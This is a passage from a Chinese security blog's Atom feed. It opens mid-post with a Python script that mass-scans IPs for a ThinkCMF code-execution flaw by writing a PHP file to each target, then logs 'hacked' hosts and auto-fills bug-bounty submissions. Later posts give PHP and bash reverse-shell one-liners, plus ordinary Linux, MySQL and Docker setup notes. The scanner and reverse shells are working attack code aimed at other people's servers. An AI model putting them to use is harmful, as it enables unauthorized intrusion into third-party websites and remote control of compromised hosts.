=&apos;&apos;&amp;content=&lt;php&gt;file_put_contents(&apos;test1.php&apos;,base64_decode(&apos;PD9waHAgcGhwaW5mbygpOyA/Pg==&apos;))&lt;/php&gt;&quot;</span><br><span class="line">test_url = &quot;http://%s&quot; % ip + payload</span><br><span class="line">requests.get(test_url)</span><br><span class="line">check_url = &quot;http://%s&quot; % ip + &quot;/test1.php&quot;</span><br><span class="line">result = requests.get(check_url)</span><br><span class="line">return &quot;php&quot; in result.text</span><br><span class="line"></span><br><span class="line"># 漏洞存在将ip位设置为1</span><br><span class="line">def myfunction(ip):</span><br><span class="line">if check(ip):</span><br><span class="line">conn = pymysql.connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;thinkcmf&quot;)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line">cursor.execute(&quot;UPDATE com set vuln=1 where ip=&apos;%s&apos;&quot; % ip)</span><br><span class="line">conn.commit()</span><br><span class="line">cursor.close()</span><br><span class="line">conn.close()</span><br><span class="line">print(&quot;%s hacked&quot; % ip)</span><br><span class="line">else:</span><br><span class="line">print(&quot;%s nono&quot; % ip)</span><br></pre></td></tr></table></figure></p><h2 id="获取目标信息"><a href="#获取目标信息" class="headerlink" title="获取目标信息"></a>获取目标信息</h2><p>通过上一轮，我们获得了存在漏洞的ip地址，那么这些网站是否符合漏洞平台的要求，就需要通过获取目标信息来评估。<br>一般我们获取：</p><ul><li>域名信息</li><li>公司名称</li><li>权重比</li><li>位置信息</li></ul><p>我们可以通过爱站网或者站长之家进行获取，当然信息量多的话，我们可能就需要氪金利用api调用，如果数据少可以利用爬虫技术获取，最后将获取的信息入库即可。<br>爱站网：<a href="https://www.aizhan.com/" target="_blank" rel="noopener">https://www.aizhan.com/</a><br>站长之家：<a href="http://www.chinaz.com/" target="_blank" rel="noopener">http://www.chinaz.com/</a><br>通过以上方法获取到域名、公司等信息，可能会存在不同的ip是相同的域名，那么我们就需要通过sql语句进行去重操作。去重sql语句，可以通过下例自己修改：<br><code>DELETE FROM subdomain WHERE name IN(SELECT name FROM (SELECT name FROM subdomain GROUP BY name HAVING COUNT(name) &gt; 1) a) AND id NOT IN(SELECT * FROM (SELECT MIN(id) FROM subdomain GROUP BY name HAVING COUNT(name) &gt; 1) b)</code></p><h2 id="快速提交"><a href="#快速提交" class="headerlink" title="快速提交"></a>快速提交</h2><p>一般漏洞平台需要我们提供zip文件和各种描述，我们对于同一个漏洞不同网站的提交，描述基本上都一样，不同的只是公司名和域名，那么我们可以先建立md文档，利用py脚本对其填充即可。<br>而对于网站内信息的填写，我本人是通过js代码进行半自动化提交，通过python生成js代码，在利用js代码在网页中执行即可。示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">document.querySelector(&quot;#inputCompy&quot;).value = &quot;腾讯&quot;</span><br><span class="line">document.querySelector(&quot;#tabs &gt; form &gt; div.tabs-con.tabs-con-loo &gt; ul &gt; li:nth-child(3) &gt; input&quot;).value = &quot;tecent.com&quot;</span><br><span class="line">document.querySelector(&quot;#selCate&quot;).value=&quot;1&quot;</span><br><span class="line">document.querySelector(&quot;#title&quot;).value=&quot;腾讯存在代码执行漏洞&quot;</span><br><span class="line">document.querySelector(&quot;#cateURL &gt; input&quot;).value=&quot;http://tecent.com?a=fetch&amp;templateFile=public/index&amp;prefix=&apos;&apos;&amp;content=&lt;php&gt;file_put_contents(&apos;test.php&apos;,base64_decode(&apos;PD9waHAgcGhwaW5mbygpOyA/Pg==&apos;))&lt;/php&gt;&quot;</span><br><span class="line">document.querySelector(&quot;#lootypesel2&quot;).value=&quot;4&quot;</span><br><span class="line">document.querySelector(&quot;#description&quot;).value=&quot;该系统cms使用的是thinkcmf，存在代码执行漏洞&quot;</span><br><span class="line">document.querySelector(&quot;#repair_suggest&quot;).value=&quot;尽快到官方网站跟新补丁&quot;</span><br><span class="line">document.querySelector(&quot;#industry1&quot;).value=&quot;6&quot;</span><br><span class="line">document.querySelector(&quot;#selec1&quot;).value=&quot;深圳市&quot;</span><br><span class="line">document.querySelector(&quot;#tabs &gt; form &gt; div.tabs-con.tabs-con-loo &gt; ul &gt; li.addInput.addInput2 &gt; p &gt; input[type=checkbox]&quot;).value=&quot;1&quot;</span><br><span class="line">document.querySelector(&quot;#agreep &gt; input[type=checkbox]&quot;).value=&quot;1&quot;</span><br></pre></td></tr></table></figure></p><p>听小伙伴说大佬能够全自动化绕验证码提交，很是羡慕，不知道是怎么实现的。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>以上思路实现还是挺简单的，如果有小伙伴想试试刷补天这些类似平台，可以利用上述方法。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近Thinkcmf爆出了一个0day，可以利用该漏洞在网站根目录下写文件，并可以访问，从而触发代码执行漏洞。对于刚爆出的漏洞，我们如何进行
      
    
    </summary>
    
      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>python编程总结</title>
    <link href="http://yoursite.com/2019/10/24/python%E7%BC%96%E7%A8%8B%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2019/10/24/python编程总结/</id>
    <published>2019-10-24T14:41:02.000Z</published>
    <updated>2019-10-24T14:41:02.308Z</updated>
    
    <content type="html"><![CDATA[<h2 id="python操作mysql数据库"><a href="#python操作mysql数据库" class="headerlink" title="python操作mysql数据库"></a>python操作mysql数据库</h2><p>查询<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import pymysql</span><br><span class="line">db = pymysql.connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;subdomain&quot;)</span><br><span class="line">cursor = db.cursor()</span><br><span class="line">cursor.execute(&quot;select version&quot;)</span><br><span class="line">data = cursor.fetchone()</span><br><span class="line">db.close()</span><br></pre></td></tr></table></figure></p><p>插入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">conn = pymysql.connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;tool&quot;)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line">for name in l:</span><br><span class="line">try:</span><br><span class="line">cursor.execute(&quot;insert into maodou(name) values (&apos;%s&apos;)&quot; % name)</span><br><span class="line">except:</span><br><span class="line">print(&quot;子域名重复：%s&quot; % name)</span><br><span class="line">conn.commit()</span><br><span class="line">cursor.close()</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure></p><h2 id="python文件操作"><a href="#python文件操作" class="headerlink" title="python文件操作"></a>python文件操作</h2><p>写文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&quot;./subdomain.txt&quot;,&quot;a&quot;,encoding=&apos;UTF-8&apos;) as fp:</span><br><span class="line">fp.write(&quot;6666&quot;)</span><br></pre></td></tr></table></figure></p><p>读取文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(path,&apos;r&apos;,encoding=&apos;UTF-8&apos;) as fp:</span><br><span class="line">s = fp.read()</span><br></pre></td></tr></table></figure></p><h2 id="dns解析域名"><a href="#dns解析域名" class="headerlink" title="dns解析域名"></a>dns解析域名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">print(socket.gethostbyname(&apos;host&apos;))</span><br></pre></td></tr></table></figure><h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><p>简单的小demo<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import threading</span><br><span class="line">def myfunction(arg1):</span><br><span class="line">print(&quot;thread %s is running\n&quot; % threading.current_thread().name)</span><br><span class="line">print(arg1)</span><br><span class="line">print(&quot;thread %s is ended\n&quot; % threading.current_thread().name)</span><br><span class="line"></span><br><span class="line">for i in range(10):</span><br><span class="line">t = threading.Thread(target=myfunction,name=str(i),args=(i,)) </span><br><span class="line">t.start()</span><br></pre></td></tr></table></figure></p><p>执行框架，10线程同时进行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">def myfunction(ip):</span><br><span class="line"># 线程执行语句</span><br><span class="line">if check(ip):</span><br><span class="line">conn = pymysql.connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;thinkcmf&quot;)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line">cursor.execute(&quot;UPDATE com set vuln=2 where ip=&apos;%s&apos;&quot; % ip)</span><br><span class="line">conn.commit()</span><br><span class="line">cursor.close()</span><br><span class="line">conn.close()</span><br><span class="line">print(&quot;%s hacked&quot; % ip)</span><br><span class="line">else:</span><br><span class="line">print(&quot;%s nono&quot; % ip)</span><br><span class="line"></span><br><span class="line">def run(ip):</span><br><span class="line">lwork = []</span><br><span class="line"># 设置线程数量，将10个数据每个送进一个线程</span><br><span class="line">for i in range(0,10):</span><br><span class="line">data = ip[i][0]</span><br><span class="line"># 进入线程</span><br><span class="line">t = threading.Thread(target=myfunction,name=data,args=(data,)) </span><br><span class="line">t.start()</span><br><span class="line">lwork.append(t)</span><br><span class="line"></span><br><span class="line">for i in lwork:</span><br><span class="line">i.join()</span><br><span class="line"># 获取list数据</span><br><span class="line">ip = getIP()</span><br><span class="line">for i in range(0,17):</span><br><span class="line">print(&quot;[*]%d turn is start&quot; % i)</span><br><span class="line"># 通过切片技术，每十个传进来</span><br><span class="line">run(ip[i*10:i*10+10])</span><br><span class="line">print(&quot;[*]%d turn finished&quot; % i)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;python操作mysql数据库&quot;&gt;&lt;a href=&quot;#python操作mysql数据库&quot; class=&quot;headerlink&quot; title=&quot;python操作mysql数据库&quot;&gt;&lt;/a&gt;python操作mysql数据库&lt;/h2&gt;&lt;p&gt;查询&lt;br&gt;&lt;figure 
      
    
    </summary>
    
      <category term="杂货店" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B4%A7%E5%BA%97/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>反弹shell合集</title>
    <link href="http://yoursite.com/2019/10/24/%E5%8F%8D%E5%BC%B9shell%E5%90%88%E9%9B%86/"/>
    <id>http://yoursite.com/2019/10/24/反弹shell合集/</id>
    <published>2019-10-24T14:30:07.000Z</published>
    <updated>2019-10-24T14:30:07.638Z</updated>
    
    <content type="html"><![CDATA[<h2 id="php反弹shell"><a href="#php反弹shell" class="headerlink" title="php反弹shell"></a>php反弹shell</h2><p><code>&lt;?php $sock = fsockopen(&quot;127.0.0.1&quot;, 1234);$descriptorspec = array(0 =&gt; $sock,1 =&gt; $sock, 2 =&gt; $sock);$process = proc_open(&quot;/bin/bash&quot;, $descriptorspec, $pipes);proc_close($process);</code></p><h2 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a>bash反弹shell</h2><p><code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;php反弹shell&quot;&gt;&lt;a href=&quot;#php反弹shell&quot; class=&quot;headerlink&quot; title=&quot;php反弹shell&quot;&gt;&lt;/a&gt;php反弹shell&lt;/h2&gt;&lt;p&gt;&lt;code&gt;&amp;lt;?php $sock = fsockopen(&amp;quot
      
    
    </summary>
    
      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>linux常用指令</title>
    <link href="http://yoursite.com/2019/10/19/linux%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/"/>
    <id>http://yoursite.com/2019/10/19/linux常用指令/</id>
    <published>2019-10-19T15:28:53.000Z</published>
    <updated>2019-10-19T15:28:53.473Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Mysql授权用户远程访问"><a href="#Mysql授权用户远程访问" class="headerlink" title="Mysql授权用户远程访问"></a>Mysql授权用户远程访问</h2><p>登录Mysql，执行sql语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">grant all privileges on *.* to &apos;root&apos;@&apos;%&apos; identified by &apos;root&apos; with grant option;</span><br><span class="line">flush privileges;</span><br><span class="line">quit;</span><br></pre></td></tr></table></figure></p><p>修改mysqld.cnf，默认位置在/etc/mysql/mysql.conf.d<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/mysql/mysql.conf.d/mysqld.cnf</span><br></pre></td></tr></table></figure></p><p>将bind=127.0.0.1注释掉<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service mysql restart</span><br></pre></td></tr></table></figure></p><p>重启mysql即可</p><h2 id="Mysql指令"><a href="#Mysql指令" class="headerlink" title="Mysql指令"></a>Mysql指令</h2><p>建库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create database test</span><br></pre></td></tr></table></figure></p><p>建表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create table tb_dept(</span><br><span class="line">     Id int primary key auto_increment,#部门编号 整形 主键 自增长</span><br><span class="line">     Name varchar(18),#部门名称</span><br><span class="line">     description varchar(100)#描述 );</span><br></pre></td></tr></table></figure></p><p>传数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load data local infile &quot;D:/test.txt&quot; into table users fields terminated by &apos;,&apos;;</span><br></pre></td></tr></table></figure></p><p>查看可写权限<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure></p><p>去重<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM subdomain WHERE name IN(SELECT name FROM (SELECT name FROM subdomain GROUP BY name HAVING COUNT(name) &gt; 1) a) AND id NOT IN(SELECT * FROM (SELECT MIN(id) FROM subdomain GROUP BY name HAVING COUNT(name) &gt; 1) b)</span><br></pre></td></tr></table></figure></p><p>清空表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TRUNCATE TABLE table1</span><br></pre></td></tr></table></figure></p><h2 id="Git操作"><a href="#Git操作" class="headerlink" title="Git操作"></a>Git操作</h2><p>ssh和https抓取<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:k4ge/k4ge</span><br><span class="line">git clone https://github.com/k4ge/k4ge</span><br></pre></td></tr></table></figure></p><h2 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install docker</span><br><span class="line">apt-get install docker.io</span><br><span class="line">apt-get install docker-compose</span><br></pre></td></tr></table></figure><h2 id="Docker-compose安装"><a href="#Docker-compose安装" class="headerlink" title="Docker-compose安装"></a>Docker-compose安装</h2><p>到github，docker项目<br><a href="https://github.com/docker/compose/releases" target="_blank" rel="noopener">https://github.com/docker/compose/releases</a><br>以14.1为例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://github.com/docker/compose/releases/download/1.24.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/local/bin/docker-compose /usr/local/bin</span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><h2 id="Docker更改源"><a href="#Docker更改源" class="headerlink" title="Docker更改源"></a>Docker更改源</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gedit /etc/docker/daemon.json</span><br></pre></td></tr></table></figure><p>添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;registry-mirrors&quot;: [&quot;https://docker.mirrors.ustc.edu.cn/&quot;,&quot;https://hub-mirror.c.163.com&quot;,&quot;https://registry.docker-cn.com&quot;],</span><br><span class="line">&quot;insecure-registries&quot;: [&quot;10.0.0.12:5000&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>重启docker<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart docker.service</span><br><span class="line">service docker restart</span><br></pre></td></tr></table></figure></p><h2 id="lnmp安装"><a href="#lnmp安装" class="headerlink" title="lnmp安装"></a>lnmp安装</h2><p>一键安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://soft.vpser.net/lnmp/lnmp1.6.tar.gz -cO lnmp1.6.tar.gz &amp;&amp; tar zxf lnmp1.6.tar.gz &amp;&amp; cd lnmp1.6 &amp;&amp; ./install.sh lnmp</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">nginx:</span><br><span class="line"> image: index.alauda.cn/library/nginx</span><br><span class="line"> links:</span><br><span class="line"> - phpfpm</span><br><span class="line"> ports:</span><br><span class="line"> - &quot;80:80&quot;</span><br><span class="line"> - &quot;443:443&quot;</span><br><span class="line"> volumes:</span><br><span class="line"> - /Users/chenishr/www:/usr/share/nginx/html</span><br><span class="line"> - ./nginx.conf:/etc/nginx/nginx.conf</span><br><span class="line"> - ./nginx.d:/etc/nginx/conf.d</span><br><span class="line"></span><br><span class="line">mysql:</span><br><span class="line"> image: index.alauda.cn/library/mysql</span><br><span class="line"> environment:</span><br><span class="line"> MYSQL_ROOT_PASSWORD: qazasdedc123</span><br><span class="line"> ports:</span><br><span class="line"> - &quot;3306:3306&quot;</span><br><span class="line"></span><br><span class="line">phpfpm:</span><br><span class="line"> image: index.alauda.cn/library/php:7.0-fpm</span><br><span class="line"> links:</span><br><span class="line"> - mysql</span><br><span class="line"> volumes:</span><br><span class="line"> - /Users/chenishr/www:/var/www/html</span><br><span class="line"> ports:</span><br><span class="line"> - &quot;9000:9000&quot;</span><br></pre></td></tr></table></figure><p>改端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/nginx/conf/</span><br><span class="line">vi nginx.conf</span><br><span class="line">修改listen的值</span><br></pre></td></tr></table></figure></p><p>绑定域名<br><a href="https://blog.csdn.net/grn11/article/details/77869117" target="_blank" rel="noopener">https://blog.csdn.net/grn11/article/details/77869117</a></p><h2 id="更换源"><a href="#更换源" class="headerlink" title="更换源"></a>更换源</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gedit /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>在这里找个合适的替换掉文件内容即可<br><a href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/</a><br>清华源：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line"># 预发布软件源，不建议启用</span><br><span class="line"># deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse</span><br></pre></td></tr></table></figure></p><h2 id="apache启动"><a href="#apache启动" class="headerlink" title="apache启动"></a>apache启动</h2><p>安装apache<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install apache2</span><br></pre></td></tr></table></figure></p><p>安装php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php</span><br></pre></td></tr></table></figure></p><p>配置apache与php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libapache2-mod-php</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/apache2 start</span><br><span class="line">/etc/init.d/apache2 restart</span><br><span class="line">/etc/init.d/apache2 stop</span><br></pre></td></tr></table></figure><h2 id="linux进程"><a href="#linux进程" class="headerlink" title="linux进程"></a>linux进程</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -ef |grep redis</span><br><span class="line">kill -9 4394</span><br></pre></td></tr></table></figure><h2 id="mysqli"><a href="#mysqli" class="headerlink" title="mysqli"></a>mysqli</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php7.0-mysqli php7.0-mysqlnd</span><br></pre></td></tr></table></figure><h2 id="gcc"><a href="#gcc" class="headerlink" title="gcc"></a>gcc</h2><p>编译C语言程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c</span><br></pre></td></tr></table></figure></p><h2 id="v2ray安装"><a href="#v2ray安装" class="headerlink" title="v2ray安装"></a>v2ray安装</h2><p>推荐vultr硅谷，centos7.x版本<br>v2ray只支持TCP和UDP，而ping使用的是icmp协议，所以用ping测试是无效的。</p><h3 id="服务器端"><a href="#服务器端" class="headerlink" title="服务器端"></a>服务器端</h3><p>v2ray一键安装脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -N --no-check-certificate https://raw.githubusercontent.com/KiriKira/v2ray.fun/kiriMod/install.sh &amp;&amp; bash install.sh</span><br></pre></td></tr></table></figure></p><p>更改内核<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum -y install wget</span><br><span class="line"></span><br><span class="line">wget --no-check-certificate https://blog.asuhu.com/sh/ruisu.sh &amp;&amp; bash ruisu.sh</span><br></pre></td></tr></table></figure></p><p>锐速加速<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -N --no-check-certificate https://raw.githubusercontent.com/91yun/serverspeeder/master/serverspeeder-all.sh &amp;&amp; bash serverspeeder-all.sh</span><br></pre></td></tr></table></figure></p><h3 id="windows客户端"><a href="#windows客户端" class="headerlink" title="windows客户端"></a>windows客户端</h3><p>v2ray客户端<br><a href="https://github.com/v2ray/v2ray-core/releases" target="_blank" rel="noopener">https://github.com/v2ray/v2ray-core/releases</a><br><a href="https://github.com/2dust/v2rayN/releases" target="_blank" rel="noopener">https://github.com/2dust/v2rayN/releases</a><br>将v2rayN客户端合并到v2ray目录中，打开v2rayN配置参数即可。</p><h3 id="linux客户端"><a href="#linux客户端" class="headerlink" title="linux客户端"></a>linux客户端</h3><p>安装v2ray客户端<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;(curl -L -s https://install.direct/go.sh)</span><br></pre></td></tr></table></figure></p><p>不开代理速度真的有点慢，建议windows下迅雷下载拷贝过来<br><a href="https://github.com/v2ray/v2ray-core/releases" target="_blank" rel="noopener">https://github.com/v2ray/v2ray-core/releases</a></p><p>将服务器端的<code>/root/config.json</code>拷贝到客户端目录下，运行v2ray<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./v2ray</span><br><span class="line">nohup ./v2ray &gt;/dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure></p><p>火狐浏览器代理设置<br><img src="/img/1569145652385.png" alt=""></p><p>proxychains设置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install proxychains</span><br><span class="line">gedit /etc/proxychains.conf</span><br></pre></td></tr></table></figure></p><p>在最后一行添加<br><code>socks5     127.0.0.1 1080</code><br>设置别名和开机自启动见其他选项</p><h2 id="alias"><a href="#alias" class="headerlink" title="alias"></a>alias</h2><p>设置别名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias 